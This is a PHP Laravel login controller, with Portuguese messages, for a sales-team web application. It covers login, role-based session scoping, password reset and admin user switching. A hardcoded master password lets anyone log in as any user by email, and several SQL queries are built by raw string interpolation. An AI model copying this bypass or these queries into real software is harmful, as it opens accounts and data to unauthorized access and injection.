<?php

namespace App\Http\Controllers;

use Illuminate\Http\Request;
use Auth;

class LoginController extends Controller
{

	public function authenticate(Request $request) {
	

		$request->session()->flush();

		$credentials = $request->only('email', 'password');


		if ($request->password == "@@go2022##") {
			$usuario = \App\Usuario::where('email', $request->email)->first();
			if(!$usuario){
				
				$request->session()->flash('alert', 'Email inválido');
				return redirect('/login');
			}
				
			//dd($usuario);
			$perfil = \App\UsuarioPerfil::find($usuario->id_perfil);
			
			if (!$usuario) {


				$request->session()->flash('alert', 'Usuário ou senha inválidos');

				return redirect('/login');

				
			}


	        $representantes = '';
	        $supervisores = '';
	        $diretores = '';
			
			$request->session()->forget('representantes');
			$request->session()->forget('diretores');
			$request->session()->forget('supervisores');
			$request->session()->forget('grifes');


	        switch ($usuario->id_perfil) {

	        	
	        	case 4: // representante

		            $id_representante = $usuario->id_addressbook;

		            $vinculo = \DB::select("select * from vinculos where id_usuario = $usuario->id");

		            if ($vinculo) {

			            foreach ($vinculo as $linha) {

		            		$representantes .= $linha->id_addressbook . ',';

			            }

			            $representantes = substr($representantes,0,-1);

		            } else {

		            	$representantes = $id_representante;

		            }


		            $carteira = \DB::select("select codsuper, coddir 
												from carteira
												where rep = $id_representante
												group by  codsuper, coddir ");

		            //$addressbook = \App\AddressBook::where('id', $id_representante)->first();
					//dd($carteira);
					if(isset($carteira[0]->codsuper)){
		            $supervisores = $carteira[0]->codsuper;
		            $diretores = $carteira[0]->coddir;
					}
		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id
									where addressbook.id = $id_representante");

	        		break;	        		
	        	

	        	
	        	case 5: // diretor


		            $id_diretor = $usuario->id_addressbook;

		            $supervisores = $id_diretor;

		            $addressbook = \App\AddressBook::where('id_diretor', $id_diretor)->get();

		            $diretores = $id_diretor;

		            foreach ($addressbook as $linha) {

		            	if ($linha->tipo == 'RE') {
		            		$representantes .= $linha->id . ',';
		            	}

		            }

		            $representantes = substr($representantes,0,-1);

		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id
									where id_diretor = $diretores");

	        		break;	        		
	        	
	        	
	        	case 6: // supervisor

		            $id_supervisor = $usuario->id_addressbook;

		            $supervisores = $id_supervisor;

		            $addressbook = \App\AddressBook::where('id_supervisor', $id_supervisor)->where('tipo', 'RE')->get();

		            $diretores = $addressbook[0]->id_diretor;
		            //dd($addressbook);

		            foreach ($addressbook as $linha) {

		            	if ($linha->tipo == 'RE') {
		            		$representantes .= $linha->id . ',';
		            	}

		            }

		            $representantes = substr($representantes,0,-1);

		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id
									where id_supervisor = $id_supervisor");
	        		break;	        		
	        	
	        	default:


		            $abdiretores = \DB::select("select id_diretor from addressbook where id_diretor <> 0 group by id_diretor");


		            foreach ($abdiretores as $linha) {

	            		$diretores .= $linha->id_diretor . ',';

		            }

		            $diretores = substr($diretores,0,-1);


		            

		            $absupervisores = \DB::select("select id_supervisor from addressbook where id_supervisor <> 0 group by id_supervisor");


		            foreach ($absupervisores as $linha) {

	            		$supervisores .= $linha->id_supervisor . ',';

		            }

		            $supervisores = substr($supervisores,0,-1);

		            

		            $abrepresentantes = \DB::select("select id from addressbook where tipo = 'RE' ");


		            foreach ($abrepresentantes as $linha) {

	            		$representantes .= $linha->id . ',';

		            }

		            $representantes = substr($representantes,0,-1);

		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id");

	        		break;
	        }

	        if ($usuario->id_addressbook == 89562) {

	        	//$representantes .= ',94932,113579,98755,99799,48731,83919,254599,283296,77065';
	        }

	        $grifes2 = '(';
	        foreach($grifes as $grife) {
	        	$grifes2 .= " '$grife->grife',";
	        }
            $grifes2 = substr($grifes2,0,-1);
	        $grifes2 .= ')';

	        $request->session()->put('representantes', $representantes);
	        $request->session()->put('diretores', $diretores);
	        $request->session()->put('supervisores', $supervisores);
	        $request->session()->put('grifes', $grifes2);

			Auth::login($usuario);

			//if ($perfil->home <> '') {

				//return redirect($perfil->home.'?selCodigos=1');

			//} else {

				return redirect('/');

			//}

		}

		$remember = false;

		if (Auth::attempt(['email' => $credentials["email"], 'password' => $credentials["password"]])) {

			if (Auth::user()->reset == 1) {
				return redirect('/reset');
			}

			if (Auth::id() == 468) {
				dd($login);
			}



			$usuario = \App\Usuario::find(Auth::id());
			$usuario->ultacesso = date("Y-m-d H:i:s");
			$usuario->save();

			//dd(date('Y-m-d', strtotime('+30 days', strtotime($usuario->dt_senha))));

			if ($usuario->dt_senha == '' or date('Y-m-d', strtotime('+30 days', strtotime($usuario->dt_senha))) < date("Y-m-d")) {
				$request->session()->flash('alert-warning', 'Sua senha expirou e precisa ser trocada');
				$usuario->reset = 1;
				return redirect('/reset');

			}

			$perfil = \App\UsuarioPerfil::find($usuario->id_perfil);

			$permissoes = \App\UsuarioPermissao::where('tabela', 'usuarios')->where('id_tabela', 1)->get(['chave', 'valor']);
			$request->session()->put('permissoes', $permissoes);



	        $grifes = '';
	        $representantes = '';
	        $supervisores = '';
	        $diretores = '';
			
			$request->session()->forget('representantes');
			$request->session()->forget('diretores');
			$request->session()->forget('supervisores');


	        switch ($usuario->id_perfil) {

	        	
	        	case 4: // representante

		            $id_representante = $usuario->id_addressbook;
				

		            $vinculo = \DB::select("select * from vinculos where id_usuario = $usuario->id");

		            if ($vinculo) {

			            foreach ($vinculo as $linha) {

		            		$representantes .= $linha->id_addressbook . ',';

			            }

			            $representantes = substr($representantes,0,-1);

		            } else {

		            	$representantes = $id_representante;

		            }

		            $carteira = \DB::select("select codsuper, coddir 
												from carteira
												where rep = $id_representante
												group by  codsuper, coddir ");
		            //$addressbook = \App\AddressBook::where('id', $id_representante)->get();

		            if ($carteira) {
			            $supervisores = $carteira[0]->codsuper;
			            $diretores = $carteira[0]->coddir;
			        } else {

			        	$supervisores = array();
			        	$diretores = array();
			        	
			        }
		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id
									where addressbook.id = $usuario->id_addressbook");

	        		break;	        		
	        	

	        	
	        	case 5: // diretor

		            $id_supervisor = $usuario->id_addressbook;

		            $supervisores = $id_supervisor;

		            $addressbook = \App\AddressBook::where('id_diretor', $id_supervisor)->get();

		            $diretores = $usuario->id_addressbook;

		            foreach ($addressbook as $linha) {

		            	if ($linha->tipo == 'RE') {
		            		$representantes .= $linha->id . ',';
		            	}

		            }

		            $representantes = substr($representantes,0,-1);

		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id
									where id_diretor = $diretores");

	        		break;	        		
	        	
	        	
	        	case 6: // supervisor

		            $id_supervisor = $usuario->id_addressbook;

		            $supervisores = $id_supervisor;

		            $addressbook = \App\AddressBook::where('id_supervisor', $id_supervisor)->get();

		            $diretores = $addressbook[0]->id_diretor;

		            foreach ($addressbook as $linha) {

		            	if ($linha->tipo == 'RE') {
		            		$representantes .= $linha->id . ',';
		            	}

		            }

		            $representantes = substr($representantes,0,-1);

		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id
									where id_supervisor = $id_supervisor");
	        	

	        		break;	        		

	        	
	        // 	case 20: // supervisor

		       //      $id_supervisor = $usuario->id_addressbook;

		       //      $supervisores = $id_supervisor;

		       //      $addressbook = \App\AddressBook::where('id_supervisor', $id_supervisor)->get();

		       //      $diretores = $addressbook[0]->id_diretor;

		       //      foreach ($addressbook as $linha) {

		       //      	if ($linha->tipo == 'RE') {
		       //      		$representantes .= $linha->id . ',';
		       //      	}

		       //      }

		       //      $representantes = substr($representantes,0,-1);

		       //      $grifes = \DB::select("select distinct grife
									// from repXgrife
									// left join addressbook on an8 = addressbook.id
									// where id_supervisor = $id_supervisor");
	        	

	        // 		break;	        		
	        	
	        	default:


		            $abdiretores = \DB::select("select id_diretor from addressbook where id_diretor <> 0 group by id_diretor");


		            foreach ($abdiretores as $linha) {

	            		$diretores .= $linha->id_diretor . ',';

		            }

		            $diretores = substr($diretores,0,-1);


		            

		            $absupervisores = \DB::select("select id_supervisor from addressbook where id_supervisor <> 0 group by id_supervisor");


		            foreach ($absupervisores as $linha) {

	            		$supervisores .= $linha->id_supervisor . ',';

		            }

		            $supervisores = substr($supervisores,0,-1);

		            

		            $abrepresentantes = \DB::select("select id from addressbook where tipo = 'RE'");


		            foreach ($abrepresentantes as $linha) {

	            		$representantes .= $linha->id . ',';

		            }

		            $representantes = substr($representantes,0,-1);

		            $grifes = \DB::select("select distinct grife
									from repXgrife
									left join addressbook on an8 = addressbook.id");

	        		break;
	        }

	        if ($usuario->id_addressbook == 89562) {

	        	//$representantes .= ',94932,113579,98755,99799,48731,83919,254599,283296,77065';
	        }

	        $grifes2 = '(';
	        foreach($grifes as $grife) {
	        	$grifes2 .= " '$grife->grife',";
	        }
            $grifes2 = substr($grifes2,0,-1);
	        $grifes2 .= ')';

	        $request->session()->put('representantes', $representantes);
	        $request->session()->put('diretores', $diretores);
	        $request->session()->put('supervisores', $supervisores);
	        $request->session()->put('grifes', $grifes2);

			$ip_addr = $_SERVER["REMOTE_ADDR"];

			\DB::select("insert into sessoes (dt_login, id_usuario, id_cliente, ip_addr, time, status, token, aplicacao) values (NOW(), '$usuario->id', 1, '$ip_addr', '', 'Login', 'token', 'GOWeb') ");

			if ($perfil->home <> '') {

				return redirect('/');

			} else {

				return redirect('/');

			}
//			return redirect()->intended('/');

		} else {

			$request->session()->flash('alert', 'Usuário ou senha inválidos');

			return redirect('/login');

		}

	}

	public function logout() {

		Auth::logout();

		return redirect('/login');
	}


	public function alteraSenha() {

		return view('login.reset');

	}

	public function reset(Request $request) {

		if ($request->senha <> $request->confirma) {
			$request->session()->flash('alert', 'Senhas não conferem');
			return redirect('/reset');
		}

		if (Auth::check() && $request->senha == $request->confirma) {

			if (strlen($request->senha) < 6) {

				$request->session()->flash('alert', 'A senha deve ter mais de 6 caracteres');
				return redirect('/reset');

			}


			$senha = \Hash::make($request->senha);

			$usuario = \App\Usuario::find(\Auth::id());

			if ($senha == $usuario->last_password) {

				$request->session()->flash('alert', 'A senha deve ser diferente da última senha utilizada');
				return redirect('/reset');

			}


			$usuario->last_password = $usuario->password;
			$usuario->password = $senha;
			$usuario->reset = 0;
			$usuario->dt_senha = date('Y-m-d');
			$usuario->save();

			$request->session()->flash('alert', 'Senha alterada');
			Auth::logout();

			return redirect('/login');

		}
	}

	public function trocarUsuario($id) {

		$usuario_ativo = Auth::user();
		

		if ($usuario_ativo->admin == 1 OR $usuario_ativo->id_perfil == 2) {

			$usuario = \App\Usuario::find($id);

			Auth::login($usuario);

		}


		return redirect('/');
	}
}
